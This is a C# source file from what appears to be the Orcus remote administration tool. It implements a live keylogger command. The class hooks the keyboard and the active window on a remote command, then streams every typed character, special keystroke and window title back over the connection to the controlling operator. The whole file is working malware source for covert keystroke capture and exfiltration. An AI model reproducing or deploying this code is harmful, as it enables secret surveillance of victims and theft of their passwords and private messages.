using System;
using System.Text;
using Orcus.Plugins;
using Orcus.Shared.Commands.Keylogger;
using Orcus.Shared.Commands.LiveKeylogger;
using Orcus.Shared.NetSerializer;
using Orcus.Utilities.KeyLogger;
using Keys = System.Windows.Forms.Keys;

namespace Orcus.Commands.LiveKeylogger
{
    public class LiveKeyloggerCommand : Command
    {
        private KeyboardHook _keyboardHook;
        private ActiveWindowHook _activeWindowHook;

        public override void ProcessCommand(byte[] parameter, IConnectionInfo connectionInfo)
        {
            switch ((LiveKeyloggerCommunication) parameter[0])
            {
                case LiveKeyloggerCommunication.Start:
#if DEBUG
                    Program.AsyncOperation.Post(state =>
#endif
#if !DEBUG
                    Program.AppContext.AsyncOperation.Post(state =>
#endif
                    {
                        if (_keyboardHook == null)
                        {
                            _keyboardHook = new KeyboardHook();
                            _keyboardHook.StringDown += (sender, args) =>
                            {
                                if (args.IsChar)
                                {
                                    ResponseBytes((byte) LiveKeyloggerCommunication.StringDown,
                                        Encoding.UTF8.GetBytes(args.Value), connectionInfo);
                                }
                                else
                                {
                                    var key = (Keys) args.VCode;
                                    var specialKey = KeyLoggerService.KeysToSpecialKey(key);
                                    var entry = specialKey == 0
                                        ? (KeyLogEntry) new StandardKey((Shared.Commands.Keylogger.Keys) key, true)
                                        : new SpecialKey(specialKey, true);

                                    ResponseBytes((byte) LiveKeyloggerCommunication.SpecialKeyDown,
                                        new Serializer(new[]
                                        {typeof (KeyLogEntry), typeof (SpecialKey), typeof (StandardKey)}).Serialize(
                                            entry),
                                        connectionInfo);
                                }
                            };
                            _keyboardHook.StringUp += (sender, args) =>
                            {
                                if (args.IsChar)
                                    return;

                                var key = (Keys) args.VCode;
                                var specialKey = KeyLoggerService.KeysToSpecialKey(key);
                                var entry = specialKey == 0
                                    ? (KeyLogEntry) new StandardKey((Shared.Commands.Keylogger.Keys) key, false)
                                    : new SpecialKey(specialKey, false);

                                ResponseBytes((byte) LiveKeyloggerCommunication.SpecialKeyUp,
                                    new Serializer(new[]
                                    {typeof (KeyLogEntry), typeof (SpecialKey), typeof (StandardKey)}).Serialize(entry),
                                    connectionInfo);
                            };

                        }

                        if (_activeWindowHook == null)
                        {
                            _activeWindowHook = new ActiveWindowHook();
                            _activeWindowHook.ActiveWindowChanged += (sender, args) =>
                            {
                                ResponseBytes((byte) LiveKeyloggerCommunication.WindowChanged,
                                    Encoding.UTF8.GetBytes(args.Title), connectionInfo);
                            };
                            _activeWindowHook.RaiseOne();
                        }
                        _keyboardHook.Hook();
                    }, null);
                    break;
                case LiveKeyloggerCommunication.Stop:
                    Dispose();
            break;
                default:
                    throw new ArgumentOutOfRangeException();
            }
        }

        public override void Dispose()
        {
            base.Dispose();
#if DEBUG
            if (Program.AsyncOperation != null)
            Program.AsyncOperation.Post(state =>
#endif
#if !DEBUG
                    Program.AppContext.AsyncOperation.Post(state =>
#endif
            {
                if (_keyboardHook != null)
                {
                    _keyboardHook.Dispose();
                    _keyboardHook = null;
                }

                if (_activeWindowHook != null)
                {
                    _activeWindowHook.Dispose();
                    _activeWindowHook = null;
                }
            }, null);
        }

        protected override uint GetId()
        {
            return 24;
        }
    }
}